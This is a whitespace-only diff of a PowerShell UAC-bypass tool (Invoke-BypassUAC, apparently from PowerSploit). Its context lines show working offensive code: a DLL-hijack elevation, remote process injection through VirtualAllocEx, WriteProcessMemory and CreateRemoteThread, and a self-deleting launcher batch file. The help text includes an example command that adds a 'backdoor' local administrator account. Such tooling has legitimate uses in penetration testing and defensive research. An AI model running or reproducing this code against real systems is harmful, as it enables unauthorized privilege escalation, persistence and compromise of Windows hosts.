@@ -3,8 +3,8 @@ function Invoke-BypassUAC
     <#
     .SYNOPSIS
 
-    Performs the bypass UAC attack by utilizing the trusted publisher 
-    certificate through process injection. 
+    Performs the bypass UAC attack by utilizing the trusted publisher
+    certificate through process injection.
 
     PowerSploit Function: Invoke-BypassUAC
     Author: @sixdub, @harmj0y, @mattifestation, @meatballs__, @TheColonial
@@ -14,19 +14,19 @@ function Invoke-BypassUAC
 
     .DESCRIPTION
 
-    If a payload .dll is used, please set it to use ExitProcess. If a command is 
-    specified, a self-deleting launcher.bat will be created that executes a given 
+    If a payload .dll is used, please set it to use ExitProcess. If a command is
+    specified, a self-deleting launcher.bat will be created that executes a given
     command in an elevated context. This version should work on both Windows 7 and
     Windows 8/8.1.
 
     The BypassUAC attack was originally published by Leo Davidson.
-    See http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html 
+    See http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html
     for more technical details.
 
-    This work is heavily based on PowerSploit's Invoke--Shellcode.ps1 script from 
+    This work is heavily based on PowerSploit's Invoke--Shellcode.ps1 script from
     Matthew Graeber (@mattifestation).
 
-    It also utlizes the elevator .dll from the Metasploit project from 
+    It also utlizes the elevator .dll from the Metasploit project from
     Ben Campbell (@meatballs__) and OJ Reeves (@TheColonial).
 
     .PARAMETER PayloadPath
@@ -39,15 +39,15 @@ function Invoke-BypassUAC
 
     .PARAMETER PatchExitThread
 
-    Use this switch if you would like the script to automatically patch the "ExitThread" bytes 
-    to "ExitProcess". This ensures the target hijack process exits cleanly and does not cause 
-    a popup. This technique should be used for Metasploit payloads and any payload that does 
-    not properly shut down the process on its' own. 
+    Use this switch if you would like the script to automatically patch the "ExitThread" bytes
+    to "ExitProcess". This ensures the target hijack process exits cleanly and does not cause
+    a popup. This technique should be used for Metasploit payloads and any payload that does
+    not properly shut down the process on its' own.
 
     .EXAMPLE
 
     PS C:\> Invoke-BypassUAC -Command 'net user backdoor "Password123!" /add && net localgroup administrators backdoor /add"' -Verbose
-    
+
     Create a local user 'backdoor' and add it to the local administrators group.
 
     .EXAMPLE
@@ -144,7 +144,7 @@ function Invoke-BypassUAC
     function Local:Write-HijackDll {
         <#
         .SYNOPSIS
-        Writes out a hijackable .dll that launches a 'debug.bat' file in the 
+        Writes out a hijackable .dll that launches a 'debug.bat' file in the
         same location as the .dll.
 
         .PARAMETER OutputFile
@@ -170,7 +170,7 @@ function Invoke-BypassUAC
             $OutputFile,
 
             [string]
-            $BatchPath,        
+            $BatchPath,
 
             [string]
             $Arch
@@ -217,11 +217,11 @@ function Invoke-BypassUAC
         Param
         (
             [OutputType([Type])]
-            
+
             [Parameter( Position = 0)]
             [Type[]]
             $Parameters = (New-Object Type[](0)),
-            
+
             [Parameter( Position = 1 )]
             [Type]
             $ReturnType = [Void]
@@ -236,7 +236,7 @@ function Invoke-BypassUAC
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+
         Write-Output $TypeBuilder.CreateType()
     }
     function Local:Get-ProcAddress
@@ -244,11 +244,11 @@ function Invoke-BypassUAC
         Param
         (
             [OutputType([IntPtr])]
-        
+
             [Parameter( Position = 0, Mandatory = $True )]
             [String]
             $Module,
-            
+
             [Parameter( Position = 1, Mandatory = $True )]
             [String]
             $Procedure
@@ -265,7 +265,7 @@ function Invoke-BypassUAC
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-        
+
         # Return the address of the function
         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
@@ -275,22 +275,22 @@ function Invoke-BypassUAC
         [Parameter(Position = 1, Mandatory = $true)]
         [IntPtr]
         $ProcessHandle,
-     
+
         [Parameter(Position = 2, Mandatory = $true)]
         [IntPtr]
         $StartAddress,
-     
+
         [Parameter(Position = 3, Mandatory = $false)]
         [IntPtr]
         $ArgumentPtr = [IntPtr]::Zero,
-     
+
         [Parameter(Position = 4, Mandatory = $true)]
         [System.Object]
         $Win32Functions
         )
-     
+
         [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
-     
+
         $OSVersion = [Environment]::OSVersion.Version
         #Vista and Win7
         if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
@@ -309,58 +309,58 @@ function Invoke-BypassUAC
             Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
             $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
         }
-     
+
         if ($RemoteThreadHandle -eq [IntPtr]::Zero)
         {
             Write-Verbose "Error creating remote thread, thread handle is null"
         }
-     
+
         return $RemoteThreadHandle
     }
     function Local:Get-Win32Functions
     {
         $Win32Functions = New-Object System.Object
-        
+
         $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
         $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
         $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name OpenProcess -Value $OpenProcess
-        
+
         $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
         $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
         $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
-        
+
         $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
         $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
         $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
-        
+
         $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
         $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
         $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
-        
+
         $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
         $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32])
         $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
-        
+
         $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
         $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
         $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name CloseHandle -Value $CloseHandle
-        
+
         $GetLastErrorAddr = Get-ProcAddress kernel32.dll GetLastError
         $GetLastErrorDelegate = Get-DelegateType @() ([Uint32])
         $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)
         $Win32Functions |  Add-Member NoteProperty -Name GetLastError -Value $GetLastError
-        
+
         $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
         $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
         $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
         $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
-        
+
         # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
         $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
         if ($IsWow64ProcessAddr)
@@ -369,9 +369,9 @@ function Invoke-BypassUAC
             $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
             $Win32Functions |  Add-Member NoteProperty -Name IsWow64Process -Value $IsWow64Process
         }
-        
+
         return $Win32Functions
-        
+
     }
     function Local:Inject-BypassStuff ([Int] $ProcessID, $PEBytes32, $ReflectiveOffset_32,$PEBytes64,$ReflectiveOffset_64,$PathsBytes, $Win32Functions )
     {
@@ -391,7 +391,7 @@ function Invoke-BypassUAC
         {
             # Determine is the process specified is 32 or 64 bit
             $null = $Win32Functions.IsWow64Process.Invoke($hProcess, [Ref] $IsWow64)
-            
+
             if ((!$IsWow64) -and $PowerShell32bit)
             {
                 Throw 'Unable to inject a 64-bit .dll from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
@@ -426,7 +426,7 @@ function Invoke-BypassUAC
         $RemotePathsAddr = $Win32Functions.VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $PathsBytesSize, 0x3000, 0x40)
         Write-Verbose "Paths memory reserved at 0x$($RemotePathsAddr.ToString("X$([IntPtr]::Size*2)"))"
         $null = $Win32Functions.WriteProcessMemory.Invoke($hProcess, $RemotePathsAddr, $PathsBytes, $PathsBytes.Length, [Ref] 0)
-        
+
         #######################################
         # page-align the .dll we're injecting
         $RawBytesSize = $RawBytes.Length + (1024 - ($RawBytes.Length % 1024))
@@ -442,13 +442,13 @@ function Invoke-BypassUAC
         Write-Verbose ".DLL memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
         # Copy .DLL into the previously allocated memory
         $null = $Win32Functions.WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $RawBytes, $RawBytes.Length, [Ref] 0)
-        
+
         # Execute .dll as a remote thread, offset for the ReflectiveLoader function
         $RemoteMemAddrOffset = New-Object IntPtr ($RemoteMemAddr.ToInt64()+$ReflectiveOffset)
         Write-Verbose "RemoteMemAddr: $RemoteMemAddr"
         Write-Verbose "LoaderOffset: $ReflectiveOffset"
         Write-Verbose "LoaderMemAddr: $RemoteMemAddrOffset"
-        
+
         $ThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $hProcess -StartAddress $RemoteMemAddrOffset -ArgumentPtr $RemotePathsAddr -Win32Functions $Win32Functions
 
         Write-Verbose "ThreadHandle: $ThreadHandle"
@@ -464,7 +464,7 @@ function Invoke-BypassUAC
 
         Write-Verbose '.DLL injection complete!'
     }
-    
+
     $Win32Functions = Get-Win32Functions
     if (Get-ProcAddress kernel32.dll IsWow64Process)
     {
@@ -492,11 +492,11 @@ function Invoke-BypassUAC
 
     $ReflectiveOffset_32 = 1600
     $ReflectiveOffset_64 = 1680
-    
+
     # generate a hijackable .dll with the specified command if a custom
     #   payload .dll path isn't specified
     if ($PayloadPath -eq ""){
-        
+
         if ($Command -eq "") {
             throw "Either PayloadPath or Command must be specified."
         }
@@ -505,8 +505,8 @@ function Invoke-BypassUAC
         $BatchPath = $env:Temp + "\debug.bat"
 
         # build the launcher .bat
-        "@echo off\n" | Out-File -Encoding ASCII -Append $BatchPath 
-        "start /b $Command" | Out-File -Encoding ASCII -Append $BatchPath 
+        "@echo off\n" | Out-File -Encoding ASCII -Append $BatchPath
+        "start /b $Command" | Out-File -Encoding ASCII -Append $BatchPath
         'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatchPath
 
         Write-HijackDll -OutputFile $TempPayloadPath -BatchPath $BatchPath
@@ -529,7 +529,7 @@ function Invoke-BypassUAC
             Write-Verbose "Replaced ExitThread with ExitProcess..."
             [io.file]::WriteAllBytes($TempPayloadPath,$Payload)
 
-            Write-Verbose "Patched DLL written out to $TempPayloadPath"   
+            Write-Verbose "Patched DLL written out to $TempPayloadPath"
         }
 
         else {
@@ -566,13 +566,13 @@ function Invoke-BypassUAC
         "[!] Unsupported OS!"
         throw("Unsupported OS!")
     }
-    
+
     write-verbose "Elevation DLL: $szElevDll"
     write-verbose "Elevation Dir: $szElevDir"
     write-verbose "Elevation DirSysWow64: $szElevDirSysWow64"
     write-verbose "Elevation ExeFull: $szElevExeFull"
     write-verbose "Elevation DllFull: $szElevDllFull"
-    write-verbose "Temp DLL: $szTempDllPath"    
+    write-verbose "Temp DLL: $szTempDllPath"
 
     $PathsBytes = new-object byte[] $(520 * 6)
     # convert all the strings to unicode and patch each to 520 bytes
